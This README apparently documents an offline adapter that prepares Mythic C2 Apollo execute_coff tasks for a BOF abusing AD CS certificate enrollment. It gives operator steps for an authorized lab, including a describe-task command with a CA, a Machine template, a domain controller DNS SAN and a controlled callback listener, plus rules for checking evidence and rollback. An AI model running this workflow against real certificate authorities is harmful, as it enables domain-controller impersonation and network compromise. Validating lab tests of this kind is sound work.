# Mythic integration

This repository ships an operator-side, offline-only adapter for Apollo's existing `execute_coff` command version `3`. It does not build an implant, contact Mythic, register a file, collect a filesystem snapshot, or write a certificate anywhere. The adapter emits a describe-only task record that pins the callback ID, Apollo version, `execute_coff` version, `go` entrypoint, BOF SHA-256, six binary arguments, and the exact argument bytes expected by the BOF.

Apollo `execute_coff` v3 accepts six `base64` typed arguments and packs each one as a little-endian length-prefixed binary field. The BOF pre-parser and the offline packer use that same field layout:

```text
csr_der, ca_config, template, san_dns, cdc, rmd
```

The descriptor also retains Apollo's outer argument frame for review. The `go_buffer_b64` field is the six-field buffer the BOF validates after Apollo's own framing has been removed by the COFF loader.

## Offline validation

```sh
make test
PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic \
  validate-evidence tests/fixtures/mythic/vulnerable-success.json
PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic \
  validate-evidence tests/fixtures/mythic/patched-negative-control.json
```

The fixture bundles are synthetic offline records. They prove schema and classifier behavior only; they are not live results.

## Authorized live workflow

These are future operator steps for the separately approved REDANTONETTA lab window. They are not executed by this repository or this Codex run.

1. Build the BOF locally and retain its local hash.

```sh
cd /path/to/certighost-bof
make bof
export EVIDENCE_ROOT="$HOME/RedAntonetta/artifacts/certighost-bof-20260727T143312Z/mythic/runtime"
mkdir -p "$EVIDENCE_ROOT"
shasum -a 256 build/certighost.x64.o | tee "$EVIDENCE_ROOT/certighost.x64.o.sha256"
```

2. In the authorized Mythic operation, record the callback ID, the exact installed Apollo payload-type version, and the loaded `execute_coff` command version. Proceed only when the callback is Windows x64 and `execute_coff` is version `3`.

3. Cache `build/certighost.x64.o` with Apollo's existing `register_file` or `register_coff` command. Use the cached object name `certighost.x64.o`; do not use any target-side upload, shell copy, download, or certificate save path.

4. Generate the task description from operator-local inputs. The CSR path below is local to the operator workstation, not the victim.

```sh
PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic describe-task \
  --callback-id '<MYTHIC_CALLBACK_ID>' \
  --agent-version '<EXACT_APOLLO_PAYLOAD_TYPE_VERSION>' \
  --coff-object build/certighost.x64.o \
  --csr-der '<OPERATOR_LOCAL_CSR_DER_PATH>' \
  --ca-config 'ra-ca01.certighost.redantonetta.test\REDANTONETTA-CERTIGHOST-CA' \
  --template 'Machine' \
  --san-dns 'ra-dc01.certighost.redantonetta.test' \
  --cdc '<CONTROLLED_LISTENER_FQDN_OR_IP>' \
  --rmd 'ra-dc01.certighost.redantonetta.test' \
  --output "$EVIDENCE_ROOT/task-descriptor.json"
```

5. Review `task-descriptor.json`, then paste its `operator_command` value into the authorized callback. The command invokes only `execute_coff -Coff certighost.x64.o -Function go ...` with six `base64` fields. Preserve the returned Mythic task ID and every output ID beside the callback ID.

6. Store exported Mythic output plus the explicit before/after victim filesystem capture records in an evidence bundle shaped like `tests/fixtures/mythic/*.json`. The before and after captures must cover the same host and path set and must show no BOF-attributable writes.

7. Validate the completed bundle locally.

```sh
PYTHONPYCACHEPREFIX=build/pycache python3 -m tools.certighost_mythic \
  validate-evidence "$EVIDENCE_ROOT/evidence-bundle.json"
```

For a vulnerable run, the validator requires issuance disposition `3`, a framed in-memory certificate result, callback evidence on TCP 445 and 389, target identity/SID evidence, unchanged victim filesystem captures, two vulnerable attempts across snapshot/revert, and rollback records. For a patched negative control, it requires non-issuance, no callback evidence, absent target certificate evidence, patch/build record IDs, the same unchanged filesystem proof, repeatability records, and rollback records.

## Rollback notes

The evidence bundle must retain the CA snapshot record, the revert record, post-revert checks, and cleanup records showing `revert_ca_snapshot` plus `verify_rollback_baseline`. The expected final state is `vulnerable_baseline`, matching the lab runbook's CA-only rollback procedure. The BOF itself has no target-side cleanup action because it does not write payloads, certificates, tickets, or temporary files on the victim.

## Limitations

- The adapter is intentionally pinned to Apollo `execute_coff` command version `3`; it rejects other command schemas instead of guessing.
- The repository does not submit Mythic tasks or call Mythic APIs. It only emits a reviewable descriptor and validates exported evidence.
- The repository does not generate CSRs, start SMB/LDAP listeners, perform PKINIT, inspect certificates, collect filesystem snapshots, or patch/revert a CA.
- The output parser accepts only the BOF's documented text framing and does not infer a live exploit result from incomplete evidence.
